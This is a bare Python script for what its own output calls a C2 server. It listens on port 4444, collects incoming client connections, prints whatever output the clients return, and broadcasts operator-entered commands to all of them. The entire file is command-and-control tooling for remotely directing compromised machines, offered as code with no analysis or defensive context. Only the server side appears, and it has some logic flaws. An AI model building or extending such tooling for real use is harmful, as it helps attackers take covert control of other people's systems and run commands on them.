import socket
import threading

HOST = '0.0.0.0'
PORT = 4444
clients = []


def broadcast_command(command):
    for client in clients:
        try:
            client.send(command.encode())
        except:
            clients.remove(client)

def handle_client(client, addr):
    print(f"[+] Connected: {addr}")
    while True:
        try:
            output = client.recv(4096).decode()
            if output:
                print(f"[Output from {addr}]:\n{output}")
        except:
            print(f"[-] Disconnected: {addr}")
            clients.remove(client)
            client.close()
            break


def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] C2 Server listening on {HOST}:{PORT}")

    while True:
        client, addr = server.accept()
        clients.append(client)
        thread = threading.Thread(target=handle_client, args=(client, addr))
        thread.start()

        while True:
            cmd = input("[C2] Enter command to broadcast (or 'exit'): ")
            if cmd == 'exit':
                break
            broadcast_command(cmd)

if __name__ == '__main__':
    start_server()
